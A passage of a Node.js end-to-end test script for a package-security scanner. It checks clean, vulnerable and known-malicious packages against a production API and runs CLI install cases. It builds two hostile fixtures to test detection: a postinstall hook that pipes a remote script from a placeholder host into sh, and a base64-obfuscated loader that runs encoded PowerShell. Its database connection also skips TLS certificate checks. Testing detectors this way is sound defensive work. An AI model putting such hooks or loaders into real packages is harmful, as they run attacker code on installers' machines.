#!/usr/bin/env node
'use strict';

const fs = require('fs');
const os = require('os');
const path = require('path');
const { execFileSync, spawnSync } = require('child_process');

const REGION = process.env.AWS_REGION || process.env.AWS_DEFAULT_REGION || 'eu-north-1';
const ROOT = path.resolve(__dirname, '..');
const DEFAULT_CREDENTIALS = path.join(os.homedir(), '.ceragon', 'credentials.json');

const NPM_REGISTRY = 'https://registry.npmjs.org';
const PYPI_REGISTRY = 'https://pypi.org/simple';
const CRATES_REGISTRY = 'https://crates.io';
const GONOPROXY = '';

function parseArgs(argv) {
  const out = {
    mode: 'all',
    outDir: '',
    agentExe: '',
    credentialsPath: DEFAULT_CREDENTIALS,
    concurrency: 4,
    skipInfraPreflight: false,
  };
  for (let i = 0; i < argv.length; i += 1) {
    const arg = argv[i];
    const next = () => {
      if (i + 1 >= argv.length) throw new Error(`Missing value for ${arg}`);
      i += 1;
      return argv[i];
    };
    if (arg === '--prepare') out.mode = 'prepare';
    else if (arg === '--api') out.mode = 'api';
    else if (arg === '--cli') out.mode = 'cli';
    else if (arg === '--all') out.mode = 'all';
    else if (arg === '--out-dir') out.outDir = next();
    else if (arg.startsWith('--out-dir=')) out.outDir = arg.slice('--out-dir='.length);
    else if (arg === '--agent') out.agentExe = next();
    else if (arg.startsWith('--agent=')) out.agentExe = arg.slice('--agent='.length);
    else if (arg === '--credentials') out.credentialsPath = next();
    else if (arg.startsWith('--credentials=')) out.credentialsPath = arg.slice('--credentials='.length);
    else if (arg === '--concurrency') out.concurrency = Number(next());
    else if (arg.startsWith('--concurrency=')) out.concurrency = Number(arg.slice('--concurrency='.length));
    else if (arg === '--skip-infra-preflight') out.skipInfraPreflight = true;
    else if (arg === '--help' || arg === '-h') {
      usage();
      process.exit(0);
    } else {
      throw new Error(`Unknown argument: ${arg}`);
    }
  }
  if (!out.outDir) {
    const stamp = new Date().toISOString().replace(/[-:.]/g, '').slice(0, 15) + 'Z';
    out.outDir = path.join(ROOT, '.codesec-e2e', 'runs', `prod-stress-${stamp}`);
  }
  out.outDir = path.resolve(out.outDir);
  if (!Number.isFinite(out.concurrency) || out.concurrency < 1) out.concurrency = 4;
  return out;
}

function usage() {
  console.log(`
Usage:
  node scripts/run-production-dependency-stress-e2e.cjs --prepare --out-dir <dir>
  node scripts/run-production-dependency-stress-e2e.cjs --api --out-dir <dir>
  node scripts/run-production-dependency-stress-e2e.cjs --cli --out-dir <dir> [--agent <ceragon.exe>]
  node scripts/run-production-dependency-stress-e2e.cjs --all --out-dir <dir> [--agent <ceragon.exe>]

The script reads ~/.ceragon/credentials.json, never writes the API key to output,
and writes machine-readable results under the selected output directory.
By default it also runs the read-only fetch-worker autoscaling preflight; pass
--skip-infra-preflight only for local parser/debug runs.
`.trim());
}

function ensureDir(dir) {
  fs.mkdirSync(dir, { recursive: true });
  return dir;
}

function writeJson(file, data) {
  ensureDir(path.dirname(file));
  fs.writeFileSync(file, JSON.stringify(data, null, 2));
}

function readJson(file) {
  return JSON.parse(fs.readFileSync(file, 'utf8'));
}

function runAws(args) {
  return execFileSync('aws', args, {
    encoding: 'utf8',
    stdio: ['ignore', 'pipe', 'pipe'],
    env: { ...process.env, AWS_REGION: REGION, AWS_DEFAULT_REGION: REGION, AWS_PAGER: '' },
  }).trim();
}

function runInfraPreflight(options) {
  if (options.skipInfraPreflight) {
    console.log('[preflight] Skipped by --skip-infra-preflight');
    return;
  }

  const script = path.join(ROOT, 'scripts', 'validate-fetch-worker-autoscaling.ps1');
  const shell = process.platform === 'win32' ? 'powershell.exe' : 'pwsh';
  const args = process.platform === 'win32'
    ? ['-NoProfile', '-ExecutionPolicy', 'Bypass', '-File', script, '-Region', REGION]
    : ['-NoProfile', '-File', script, '-Region', REGION];
  const result = spawnSync(shell, args, {
    cwd: ROOT,
    encoding: 'utf8',
    stdio: ['ignore', 'pipe', 'pipe'],
    env: { ...process.env, AWS_REGION: REGION, AWS_DEFAULT_REGION: REGION, AWS_PAGER: '' },
  });
  if (result.stdout) process.stdout.write(result.stdout);
  if (result.stderr) process.stderr.write(result.stderr);
  if (result.error) {
    throw result.error;
  }
  if (result.status !== 0) {
    throw new Error(`Fetch-worker autoscaling preflight failed with exit code ${result.status}`);
  }
}

function readCredentials(file) {
  const credentials = readJson(file);
  if (!credentials.apiBaseUrl || !credentials.apiKey) {
    throw new Error(`Invalid credentials file: ${file}`);
  }
  return credentials;
}

function parseApiKeyId(apiKey) {
  const match = String(apiKey || '').match(/^(?:cf_api|cfr)_([^_]+)_/);
  if (!match) throw new Error('Could not parse API key id from credentials token');
  return match[1];
}

function loadPgClient() {
  const candidates = [
    path.join(ROOT, 'Backend', 'node_modules', 'pg'),
    'pg',
  ];
  for (const candidate of candidates) {
    try {
      return require(candidate).Client;
    } catch (_) {
      // Try next candidate.
    }
  }
  throw new Error('pg module not found; run npm install in Backend first');
}

function getDatabaseUrl() {
  if (process.env.DATABASE_URL) return process.env.DATABASE_URL;
  return runAws([
    'ssm', 'get-parameter',
    '--name', '/cera/staging/backend/DATABASE_URL',
    '--with-decryption',
    '--query', 'Parameter.Value',
    '--output', 'text',
    '--region', REGION,
  ]);
}

function getDatabasePassword(fallback) {
  if (process.env.DATABASE_URL) return fallback;
  try {
    return runAws([
      'ssm', 'get-parameter',
      '--name', '/cera/staging/backend/DATABASE_PASSWORD',
      '--with-decryption',
      '--query', 'Parameter.Value',
      '--output', 'text',
      '--region', REGION,
    ]) || fallback;
  } catch (_) {
    return fallback;
  }
}

function pgSslConfig(parsed) {
  const sslMode = String(parsed.searchParams.get('sslmode') || process.env.PGSSLMODE || '').toLowerCase();
  if (['disable', 'false', '0', 'off'].includes(sslMode)) return false;
  if (['require', 'verify-ca', 'verify-full', 'no-verify'].includes(sslMode)) {
    return { rejectUnauthorized: false };
  }

  const host = String(parsed.hostname || '').toLowerCase();
  if (host === 'localhost' || host === '127.0.0.1' || host === '::1') return false;

  return { rejectUnauthorized: false };
}

function buildPgClientOptions(databaseUrl) {
  const parsed = new URL(databaseUrl);
  return {
    host: parsed.hostname,
    port: parsed.port ? Number(parsed.port) : 5432,
    database: parsed.pathname.replace(/^\//, ''),
    user: decodeURIComponent(parsed.username),
    password: getDatabasePassword(decodeURIComponent(parsed.password)),
    ssl: pgSslConfig(parsed),
  };
}

async function resolveScope(credentials) {
  const keyId = parseApiKeyId(credentials.apiKey);
  const databaseUrl = getDatabaseUrl();
  const Client = loadPgClient();
  const client = new Client(buildPgClientOptions(databaseUrl));
  await client.connect();
  try {
    const result = await client.query(
      `SELECT id, org_id, site_id, key_type, role
         FROM api_keys
        WHERE id = $1`,
      [keyId],
    );
    if (result.rowCount !== 1) {
      throw new Error(`API key ${keyId} not found in production RDS`);
    }
    return {
      keyId: result.rows[0].id,
      orgId: result.rows[0].org_id,
      siteId: result.rows[0].site_id,
      keyType: result.rows[0].key_type,
      role: result.rows[0].role,
    };
  } finally {
    await client.end();
  }
}

async function loadAnalysisRecord(analysisId) {
  if (!analysisId) return null;
  const databaseUrl = getDatabaseUrl();
  const Client = loadPgClient();
  const client = new Client(buildPgClientOptions(databaseUrl));
  await client.connect();
  try {
    const result = await client.query(
      `SELECT id, "packageName", "packageVersion", ecosystem, "riskScore", verdict,
              findings, metadata, "triggeredPolicyRules"
         FROM analysis
        WHERE id = $1`,
      [analysisId],
    );
    return result.rows[0] || null;
  } finally {
    await client.end();
  }
}

function expectation(kind, actions) {
  return { kind, actions };
}

const EXPECT_ALLOW = expectation('ALLOW', ['ALLOW', 'ALLOW_FAST']);
const EXPECT_NOT_ALLOW = expectation('NOT_ALLOW', ['BLOCK', 'PROMPT', 'HOLD']);
const EXPECT_BLOCK = expectation('BLOCK', ['BLOCK']);
const EXPECT_PROMPT_OR_BLOCK = expectation('PROMPT_OR_BLOCK', ['PROMPT', 'BLOCK']);

const API_TESTS = [
  { id: 'npm-clean-picocolors', tool: 'npm', registry: NPM_REGISTRY, target: { name: 'picocolors', version: '1.1.1' }, expect: EXPECT_ALLOW },
  { id: 'npm-clean-is-number', tool: 'npm', registry: NPM_REGISTRY, target: { name: 'is-number', version: '7.0.0' }, expect: EXPECT_ALLOW },
  { id: 'npm-clean-nanoid-latest', tool: 'npm', registry: NPM_REGISTRY, target: { name: 'nanoid', version: '5.1.11' }, expect: EXPECT_ALLOW },

  { id: 'npm-cve-lodash', tool: 'npm', registry: NPM_REGISTRY, target: { name: 'lodash', version: '4.17.20' }, expect: EXPECT_NOT_ALLOW },
  { id: 'npm-cve-minimist', tool: 'npm', registry: NPM_REGISTRY, target: { name: 'minimist', version: '0.0.8' }, expect: EXPECT_BLOCK },
  { id: 'npm-cve-axios', tool: 'npm', registry: NPM_REGISTRY, target: { name: 'axios', version: '0.21.1' }, expect: EXPECT_NOT_ALLOW },
  { id: 'npm-cve-serialize-javascript', tool: 'npm', registry: NPM_REGISTRY, target: { name: 'serialize-javascript', version: '2.1.1' }, expect: EXPECT_NOT_ALLOW },
  { id: 'npm-cve-tar', tool: 'npm', registry: NPM_REGISTRY, target: { name: 'tar', version: '4.4.13' }, expect: EXPECT_NOT_ALLOW },

  { id: 'npm-malware-event-stream', tool: 'npm', registry: NPM_REGISTRY, target: { name: 'event-stream', version: '3.3.6' }, expect: EXPECT_BLOCK },
  { id: 'npm-malware-flatmap-stream', tool: 'npm', registry: NPM_REGISTRY, target: { name: 'flatmap-stream', version: '0.1.1' }, expect: EXPECT_BLOCK },
  { id: 'npm-malware-ua-parser-js', tool: 'npm', registry: NPM_REGISTRY, target: { name: 'ua-parser-js', version: '0.7.29' }, expect: EXPECT_BLOCK },
  { id: 'npm-malware-coa', tool: 'npm', registry: NPM_REGISTRY, target: { name: 'coa', version: '2.0.3' }, expect: EXPECT_BLOCK },

  { id: 'npm-mini-shai-tanstack-removed', tool: 'npm', registry: NPM_REGISTRY, target: { name: '@tanstack/react-router', version: '1.169.5' }, expect: EXPECT_BLOCK },
  { id: 'npm-mini-shai-antv-removed', tool: 'npm', registry: NPM_REGISTRY, target: { name: 'echarts-for-react', version: '3.2.7' }, expect: EXPECT_BLOCK },
  { id: 'npm-mini-shai-sap-removed', tool: 'npm', registry: NPM_REGISTRY, target: { name: 'mbt', version: '1.2.48' }, expect: EXPECT_BLOCK },
  { id: 'npm-mini-shai-intercom-removed', tool: 'npm', registry: NPM_REGISTRY, target: { name: 'intercom-client', version: '7.0.4' }, expect: EXPECT_BLOCK },

  {
    id: 'npm-source-alias-vulnerable',
    tool: 'npm',
    registry: NPM_REGISTRY,
    target: {
      name: 'lodash-cera-alias',
      version: '4.17.20',
      sourceType: 'ALIAS',
      sourceSpec: 'lodash-cera-alias@npm:lodash@4.17.20',
      resolvedName: 'lodash',
      resolvedVersion: '4.17.20',
    },
    expect: EXPECT_NOT_ALLOW,
  },
  {
    id: 'npm-source-tarball-vulnerable',
    tool: 'npm',
    registry: NPM_REGISTRY,
    target: {
      name: 'lodash',
      version: '4.17.20',
      sourceType: 'URL_TARBALL',
      sourceSpec: 'https://registry.npmjs.org/lodash/-/lodash-4.17.20.tgz',
      sourceHost: 'registry.npmjs.org',
    },
    expect: EXPECT_NOT_ALLOW,
  },
  {
    id: 'npm-source-github-unpinned-like',
    tool: 'npm',
    registry: NPM_REGISTRY,
    target: {
      name: 'lodash',
      version: '',
      sourceType: 'GITHUB',
      sourceSpec: 'github:lodash/lodash#4.17.20',
      sourceHost: 'github.com',
      sourceRef: '4.17.20',
    },
    expect: EXPECT_PROMPT_OR_BLOCK,
  },

  { id: 'pip-clean-packaging', tool: 'pip', registry: PYPI_REGISTRY, target: { name: 'packaging', version: '24.2' }, expect: EXPECT_ALLOW },
  { id: 'pip-clean-idna', tool: 'pip', registry: PYPI_REGISTRY, target: { name: 'idna', version: '3.7' }, expect: EXPECT_ALLOW },
  { id: 'pip-clean-requests', tool: 'pip', registry: PYPI_REGISTRY, target: { name: 'requests', version: '2.32.3' }, expect: EXPECT_ALLOW },
  { id: 'pip-clean-certifi', tool: 'pip', registry: PYPI_REGISTRY, target: { name: 'certifi', version: '2024.8.30' }, expect: EXPECT_ALLOW },
  { id: 'pip-cve-urllib3', tool: 'pip', registry: PYPI_REGISTRY, target: { name: 'urllib3', version: '1.26.5' }, expect: EXPECT_NOT_ALLOW },
  { id: 'pip-cve-django', tool: 'pip', registry: PYPI_REGISTRY, target: { name: 'django', version: '1.11.29' }, expect: EXPECT_NOT_ALLOW },
  { id: 'pip-cve-pyyaml', tool: 'pip', registry: PYPI_REGISTRY, target: { name: 'pyyaml', version: '5.3.1' }, expect: EXPECT_NOT_ALLOW },
  { id: 'pip-cve-jinja2', tool: 'pip', registry: PYPI_REGISTRY, target: { name: 'jinja2', version: '2.10.1' }, expect: EXPECT_NOT_ALLOW },
  { id: 'pip-mini-shai-lightning-removed', tool: 'pip', registry: PYPI_REGISTRY, target: { name: 'lightning', version: '2.6.2' }, expect: EXPECT_BLOCK },
  { id: 'pip-mini-shai-mistralai-removed', tool: 'pip', registry: PYPI_REGISTRY, target: { name: 'mistralai', version: '2.4.6' }, expect: EXPECT_BLOCK },
  { id: 'pip-mini-shai-guardrails', tool: 'pip', registry: PYPI_REGISTRY, target: { name: 'guardrails-ai', version: '0.10.1' }, expect: EXPECT_BLOCK },
  {
    id: 'pip-custom-registry-private-name',
    tool: 'pip',
    registry: PYPI_REGISTRY,
    context: { customRegistry: 'https://packages.example.invalid/simple' },
    target: { name: 'internal-payments-client', version: '1.0.0' },
    expect: EXPECT_PROMPT_OR_BLOCK,
  },

  { id: 'cargo-clean-serde', tool: 'cargo', registry: CRATES_REGISTRY, target: { name: 'serde', version: '1.0.197' }, expect: EXPECT_ALLOW },
  { id: 'cargo-clean-ryu', tool: 'cargo', registry: CRATES_REGISTRY, target: { name: 'ryu', version: '1.0.18' }, expect: EXPECT_ALLOW },
  {
    id: 'cargo-medium-cve-time-monitored',
    tool: 'cargo',
    registry: CRATES_REGISTRY,
    target: { name: 'time', version: '0.1.44' },
    // BALANCED policy intentionally MONITORs medium CVEs. This is a scanner
    // detection check, not a policy-block check.
    expect: EXPECT_ALLOW,
    expectAnalysisContains: ['RUSTSEC-2020-0071', 'CVE-2020-26235', 'GHSA-wcg3-cvx6-7396'],
  },
  { id: 'cargo-cve-smallvec', tool: 'cargo', registry: CRATES_REGISTRY, target: { name: 'smallvec', version: '0.6.9' }, expect: EXPECT_NOT_ALLOW },

  { id: 'go-clean-google-uuid', tool: 'go', registry: 'https://proxy.golang.org', target: { name: 'github.com/google/uuid', version: 'v1.6.0' }, expect: EXPECT_ALLOW },
  { id: 'go-cve-x-crypto-old', tool: 'go', registry: 'https://proxy.golang.org', target: { name: 'golang.org/x/crypto', version: 'v0.0.0-20211202192323-5770296d904e' }, expect: EXPECT_NOT_ALLOW },
];

function coordinates() {
  const seen = new Set();
  const rows = [];
  for (const test of API_TESTS) {
    const t = test.target;
    const ecosystem = ecosystemForTool(test.tool);
    const name = t.resolvedName || t.name;
    const version = t.resolvedVersion || t.version || '';
    const key = `${ecosystem}:${name}@${version}`;
    if (!seen.has(key)) {
      seen.add(key);
      rows.push({ ecosystem, name, version });
    }
  }
  return rows;
}

function ecosystemForTool(tool) {
  if (['npm', 'yarn', 'pnpm', 'bun', 'node', 'npx'].includes(tool)) return 'npm';
  if (['pip', 'pip3', 'poetry', 'pipenv', 'pipx', 'uv'].includes(tool)) return 'pypi';
  if (tool === 'cargo') return 'cargo';
  if (tool === 'go') return 'go';
  return tool;
}

function defaultContext(test) {
  return {
    os: process.platform === 'win32' ? 'windows' : process.platform,
    arch: process.arch === 'x64' ? 'x64' : process.arch,
    hostname: os.hostname(),
    toolVersion: 'stress-e2e',
    runtimeVersion: process.version,
    registry: test.registry,
    isInteractive: false,
    isCI: true,
    callerType: 'CLI',
    sanctionedInstallPath: true,
    projectDir: 'production-dependency-stress-e2e',
    ...(test.context || {}),
  };
}

async function postJson(url, apiKey, body) {
  const response = await fetch(url, {
    method: 'POST',
    headers: {
      Authorization: `Bearer ${apiKey}`,
      'Content-Type': 'application/json',
    },
    body: JSON.stringify(body),
  });
  const text = await response.text();
  let data;
  try {
    data = JSON.parse(text);
  } catch (_) {
    data = text;
  }
  if (!response.ok) {
    const err = new Error(`HTTP ${response.status}: ${typeof data === 'string' ? data : JSON.stringify(data)}`);
    err.data = data;
    err.status = response.status;
    throw err;
  }
  return data;
}

async function getJson(url, apiKey) {
  const response = await fetch(url, {
    headers: { Authorization: `Bearer ${apiKey}` },
  });
  const text = await response.text();
  let data;
  try {
    data = JSON.parse(text);
  } catch (_) {
    data = text;
  }
  return { status: response.status, data };
}

function sleep(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

function compactFinding(finding) {
  if (!finding || typeof finding !== 'object') return finding;
  return {
    code: finding.code || finding.type || finding.ruleId || null,
    severity: finding.severity || null,
    category: finding.category || null,
    description: finding.description || finding.title || null,
    file: finding.file || finding.filePath || finding.location || null,
    line: finding.line || finding.lineNumber || null,
    sink: finding.sink || null,
  };
}

async function pollDecision(credentials, decision, maxMs = 10 * 60 * 1000) {
  if (decision.action !== 'HOLD' || !decision.analysisId) {
    return { finalDecision: decision, status: 'IMMEDIATE', polls: 0, analysis: null };
  }
  const deadline = Date.now() + maxMs;
  let polls = 0;
  let last = null;
  while (Date.now() < deadline) {
    await sleep(5000);
    polls += 1;
    const res = await getJson(`${credentials.apiBaseUrl}/api/v1/packages/analysis/${decision.analysisId}`, credentials.apiKey);
    last = res.data;
    if (res.status === 200 && last && ['COMPLETE', 'FAILED', 'TIMEOUT', 'ERROR'].includes(last.status)) {
      if (last.status === 'COMPLETE' && last.decision) {
        return { finalDecision: last.decision, status: last.status, polls, analysis: last };
      }
      return { finalDecision: decision, status: last.status, polls, analysis: last };
    }
  }
  return { finalDecision: decision, status: 'POLL_TIMEOUT', polls, analysis: last };
}

function expectationPassed(action, expect) {
  if (!expect || !expect.actions) return true;
  return expect.actions.includes(action);
}

function analysisContains(analysis, token) {
  if (!analysis || !token) return false;
  return JSON.stringify(analysis).toLowerCase().includes(String(token).toLowerCase());
}

function evaluateAnalysisExpectations(analysis, test) {
  const required = Array.isArray(test.expectAnalysisContains) ? test.expectAnalysisContains : [];
  if (required.length === 0) return { ok: true, required, missing: [] };
  const missing = required.filter((token) => !analysisContains(analysis, token));
  return { ok: missing.length === 0, required, missing };
}

function compactDecision(decision) {
  return {
    package: decision.package,
    version: decision.version,
    ecosystem: decision.ecosystem,
    action: decision.action,
    riskScore: decision.riskScore,
    reason: decision.reason,
    policyReason: decision.policyReason,
    decisionSource: decision.decisionSource,
    policyAction: decision.policyAction,
    effectiveAction: decision.effectiveAction,
    runtimeAction: decision.runtimeAction,
    cacheHit: decision.cacheHit,
    analysisId: decision.analysisId,
    triggeredRules: decision.triggeredRules,
    topFindings: (decision.topFindings || []).slice(0, 8).map(compactFinding),
    typosquat: decision.typosquat,
    aiProvenance: decision.aiProvenance,
  };
}

async function runApiTest(credentials, test, runId) {
  const started = Date.now();
  const correlationId = `${runId}-${test.id}`;
  try {
    const response = await postJson(`${credentials.apiBaseUrl}/api/v1/packages/check-packages`, credentials.apiKey, {
      tool: test.tool,
      intent: test.intent || 'INSTALL',
      targets: [test.target],
      context: defaultContext(test),
      correlationId,
    });
    const initial = response.decisions && response.decisions[0];
    if (!initial) {
      return {
        id: test.id,
        ok: false,
        error: 'No decision returned',
        correlationId,
        durationMs: Date.now() - started,
      };
    }
    const polled = await pollDecision(credentials, initial);
    const finalDecision = compactDecision(polled.finalDecision);
    let analysisCheckSource = polled.analysis ? 'api' : 'none';
    let analysisChecks = evaluateAnalysisExpectations(polled.analysis, test);
    const analysisIdForChecks = finalDecision.analysisId || initial.analysisId;
    if (!analysisChecks.ok && Array.isArray(test.expectAnalysisContains) && analysisIdForChecks) {
      const dbAnalysis = await loadAnalysisRecord(analysisIdForChecks);
      analysisChecks = evaluateAnalysisExpectations(dbAnalysis, test);
      analysisCheckSource = dbAnalysis ? 'rds' : 'none';
    }
    const ok = expectationPassed(finalDecision.action, test.expect) && analysisChecks.ok;
    return {
      id: test.id,
      ok,
      expected: test.expect,
      analysisChecks,
      analysisCheckSource,
      correlationId,
      pollStatus: polled.status,
      pollAttempts: polled.polls,
      durationMs: Date.now() - started,
      initialDecision: compactDecision(initial),
      finalDecision,
    };
  } catch (err) {
    return {
      id: test.id,
      ok: false,
      expected: test.expect,
      correlationId,
      error: err.message,
      status: err.status,
      durationMs: Date.now() - started,
    };
  }
}

async function mapLimit(items, limit, fn) {
  const results = new Array(items.length);
  let next = 0;
  const workers = Array.from({ length: Math.min(limit, items.length) }, async () => {
    while (next < items.length) {
      const index = next;
      next += 1;
      results[index] = await fn(items[index], index);
    }
  });
  await Promise.all(workers);
  return results;
}

async function runApiSuite(options, credentials) {
  const runId = `prodstress-${Date.now().toString(36)}`;
  const startedAt = new Date().toISOString();
  console.log(`[api] Running ${API_TESTS.length} direct production package checks (concurrency ${options.concurrency})`);
  const results = await mapLimit(API_TESTS, options.concurrency, async (test, index) => {
    const result = await runApiTest(credentials, test, runId);
    const action = result.finalDecision?.action || result.initialDecision?.action || 'ERROR';
    console.log(`[api] ${index + 1}/${API_TESTS.length} ${test.id}: ${action} ${result.ok ? 'PASS' : 'FAIL'}`);
    return result;
  });
  const summary = summarizeResults(results);
  const output = { startedAt, finishedAt: new Date().toISOString(), runId, summary, results };
  writeJson(path.join(options.outDir, 'api-results.json'), output);
  return output;
}

function summarizeResults(results) {
  const failed = results.filter((result) => !result.ok);
  const byAction = {};
  for (const result of results) {
    const action = result.finalDecision?.action || result.initialDecision?.action || 'ERROR';
    byAction[action] = (byAction[action] || 0) + 1;
  }
  return {
    total: results.length,
    passed: results.length - failed.length,
    failed: failed.length,
    byAction,
    failedIds: failed.map((result) => result.id),
  };
}

function findLatestAgentExe() {
  const runsDir = path.join(ROOT, '.codesec-e2e', 'runs');
  if (!fs.existsSync(runsDir)) return '';
  const matches = [];
  const stack = [runsDir];
  while (stack.length) {
    const dir = stack.pop();
    for (const entry of fs.readdirSync(dir, { withFileTypes: true })) {
      const full = path.join(dir, entry.name);
      if (entry.isDirectory()) stack.push(full);
      else if (entry.isFile() && entry.name.toLowerCase() === 'ceragon.exe') {
        matches.push({ full, mtime: fs.statSync(full).mtimeMs });
      }
    }
  }
  matches.sort((a, b) => b.mtime - a.mtime);
  return matches[0]?.full || '';
}

function setupShims(options) {
  const agentExe = path.resolve(options.agentExe || findLatestAgentExe());
  if (!agentExe || !fs.existsSync(agentExe)) {
    throw new Error('Could not find production ceragon.exe. Pass --agent <path>.');
  }
  const shimDir = ensureDir(path.join(options.outDir, 'shims'));
  for (const name of ['ceragon', 'npm', 'npx', 'pip', 'pip3', 'cargo', 'go']) {
    fs.copyFileSync(agentExe, path.join(shimDir, `${name}.exe`));
  }
  return { agentExe, shimDir };
}

function setupCliCredentials(options, credentials) {
  const programDataDir = ensureDir(path.join(options.outDir, 'programdata'));
  const machineCredsDir = ensureDir(path.join(programDataDir, 'cera'));
  fs.writeFileSync(
    path.join(machineCredsDir, 'credentials.json'),
    `${JSON.stringify(credentials, null, 2)}\n`,
    'utf8',
  );
  return programDataDir;
}

function testEnv(shimDir, programDataDir, credentials) {
  return {
    ...process.env,
    PATH: `${shimDir}${path.delimiter}${process.env.PATH || ''}`,
    ProgramData: programDataDir,
    CERA_API_KEY: credentials.apiKey,
    CERAGON_NO_TUI: '1',
    CERAGON_NONINTERACTIVE: '1',
    CI: '1',
    GONOPROXY,
    npm_config_audit: 'false',
    npm_config_fund: 'false',
    PIP_DISABLE_PIP_VERSION_CHECK: '1',
  };
}

function runCommand(file, args, cwd, env, timeoutMs = 180000) {
  const started = Date.now();
  const res = spawnSync(file, args, {
    cwd,
    env,
    encoding: 'utf8',
    timeout: timeoutMs,
    shell: false,
    windowsHide: true,
  });
  return {
    command: [file, ...args].join(' '),
    cwd,
    exitCode: typeof res.status === 'number' ? res.status : null,
    signal: res.signal,
    error: res.error ? res.error.message : undefined,
    stdout: res.stdout || '',
    stderr: res.stderr || '',
    durationMs: Date.now() - started,
  };
}

function parseCliAction(output) {
  const combined = `${output.stderr}\n${output.stdout}`;
  const match = combined.match(/\[(?:ceragon|cera)\]\s+(ALLOW_FAST|ALLOW|BLOCK|PROMPT|HOLD|INCONCLUSIVE|PENDING)\b/i);
  if (match) return match[1].toUpperCase();
  if (/Install blocked\s+.*failed security policy/i.test(combined)) return 'BLOCK';
  if (/Install blocked\s+.*held by policy/i.test(combined)) return 'HOLD';
  if (/haven't reached a final verdict yet\s+[^\r\n]*install blocked/i.test(combined)) return 'HOLD';
  if (/Install blocked\s+.*require review/i.test(combined)) return 'PROMPT';
  return null;
}

function commandPassed(result, expected) {
  const action = parseCliAction(result);
  if (expected.kind === 'ALLOW') {
    return result.exitCode === 0 && ['ALLOW', 'ALLOW_FAST'].includes(action || 'ALLOW');
  }
  if (!action) return false;
  return expected.actions.includes(action);
}

function writeFile(file, content) {
  ensureDir(path.dirname(file));
  fs.writeFileSync(file, content);
}

function realToolCommand(name) {
  const where = process.platform === 'win32' ? 'where.exe' : 'which';
  const args = process.platform === 'win32' ? [name] : [name];
  const res = spawnSync(where, args, { encoding: 'utf8', shell: false, windowsHide: true });
  const lines = (res.stdout || '').split(/\r?\n/).map((line) => line.trim()).filter(Boolean);
  if (lines.length === 0) return name;
  return lines[0];
}

function setupNpmPackageJson(dir) {
  writeFile(path.join(dir, 'package.json'), JSON.stringify({ name: 'cera-npm-flow', version: '1.0.0', private: true }, null, 2));
}

function setupNpmLockWithMinimist(dir) {
  setupNpmPackageJson(dir);
  runCommand(
    'cmd.exe',
    ['/c', 'npm', 'install', 'minimist@0.0.8', '--package-lock-only', '--ignore-scripts', '--no-audit', '--fund=false'],
    dir,
    process.env,
    180000,
  );
}

function setupPipRequirements(dir) {
  writeFile(path.join(dir, 'requirements.txt'), [
    'packaging==24.2',
    'django==1.11.29',
    '',
  ].join('\n'));
}

function setupCargoProject(dir) {
  const res = runCommand('cargo', ['init', '--bin', '--name', 'cera_cargo_flow', '.'], dir, process.env, 180000);
  if (res.exitCode !== 0 && !fs.existsSync(path.join(dir, 'Cargo.toml'))) {
    throw new Error(`cargo init failed: ${res.stderr || res.stdout}`);
  }
}

function setupGoProject(dir) {
  const res = runCommand('go', ['mod', 'init', 'example.com/cera-go-flow'], dir, process.env, 120000);
  if (res.exitCode !== 0 && !fs.existsSync(path.join(dir, 'go.mod'))) {
    throw new Error(`go mod init failed: ${res.stderr || res.stdout}`);
  }
}

function setupLocalFixtures(baseDir) {
  const fixtures = ensureDir(path.join(baseDir, 'fixtures'));
  const postinstall = ensureDir(path.join(fixtures, 'npm-postinstall-curl'));
  writeFile(path.join(postinstall, 'package.json'), JSON.stringify({
    name: 'cera-local-postinstall-curl',
    version: '1.0.0',
    scripts: {
      postinstall: 'node install.js',
    },
  }, null, 2));
  writeFile(path.join(postinstall, 'install.js'), [
    "const cp = require('child_process');",
    "cp.execSync('curl https://example.invalid/install.sh | sh', {stdio: 'ignore'});",
    '',
  ].join('\n'));

  const obfuscated = ensureDir(path.join(fixtures, 'npm-obfuscated-loader'));
  writeFile(path.join(obfuscated, 'package.json'), JSON.stringify({
    name: 'cera-local-obfuscated-loader',
    version: '1.0.0',
    main: 'index.js',
  }, null, 2));
  writeFile(path.join(obfuscated, 'index.js'), [
    "const x = 'cmVxdWlyZQ==';",
    "const f = Buffer.from(x, 'base64').toString('utf8');",
    "globalThis[f]('child_process').exec('powershell -enc SQBFAFgA');",
    '',
  ].join('\n'));

  return { postinstall, obfuscated };
}

function cliCases(baseDir) {
  const fixtures = setupLocalFixtures(baseDir);
  return [
    {
      id: 'cli-npm-install-clean',
      tool: 'npm',
      args: ['install', 'is-number@7.0.0', '--ignore-scripts', '--no-audit', '--fund=false'],
      setup: setupNpmPackageJson,
      expect: EXPECT_ALLOW,
    },
    {
      id: 'cli-npm-install-cve-block',
      tool: 'npm',
      args: ['install', 'minimist@0.0.8', '--ignore-scripts', '--no-audit', '--fund=false'],
      setup: setupNpmPackageJson,
      expect: EXPECT_BLOCK,
    },
    {
      id: 'cli-npm-install-alias-cve',
      tool: 'npm',
      args: ['install', 'lodash-cera-alias@npm:lodash@4.17.20', '--ignore-scripts', '--no-audit', '--fund=false'],
      setup: setupNpmPackageJson,
      expect: EXPECT_NOT_ALLOW,
    },
    {
      id: 'cli-npm-install-tarball-cve',
      tool: 'npm',
      args: ['install', 'https://registry.npmjs.org/lodash/-/lodash-4.17.20.tgz', '--ignore-scripts', '--no-audit', '--fund=false'],
      setup: setupNpmPackageJson,
      expect: EXPECT_NOT_ALLOW,
    },
    {
      id: 'cli-npm-ci-lockfile-cve',
      tool: 'npm',
      args: ['ci', '--ignore-scripts', '--no-audit', '--fund=false'],
      setup: setupNpmLockWithMinimist,
      expect: EXPECT_NOT_ALLOW,
    },
    {
      id: 'cli-npm-install-local-postinstall',
      tool: 'npm',
      args: ['install', fixtures.postinstall, '--ignore-scripts', '--no-audit', '--fund=false'],
      setup: setupNpmPackageJson,
      expect: EXPECT_NOT_ALLOW,
    },
    {
      id: 'cli-npm-install-local-obfuscated',
      tool: 'npm',
      args: ['install', fixtures.obfuscated, '--ignore-scripts', '--no-audit', '--fund=false'],
      setup: setupNpmPackageJson,
      expect: EXPECT_NOT_ALLOW,
    },
    {
      id: 'cli-npm-mini-shai-removed',
      tool: 'npm',
      args: ['install', '@tanstack/react-router@1.169.5', '--ignore-scripts', '--no-audit', '--fund=false'],
      setup: setupNpmPackageJson,
      expect: EXPECT_BLOCK,
    },
    {
      id: 'cli-pip-install-clean',
      tool: 'pip',
      args: ['install', 'packaging==24.2', '--target', 'vendor', '--no-deps', '--disable-pip-version-check'],
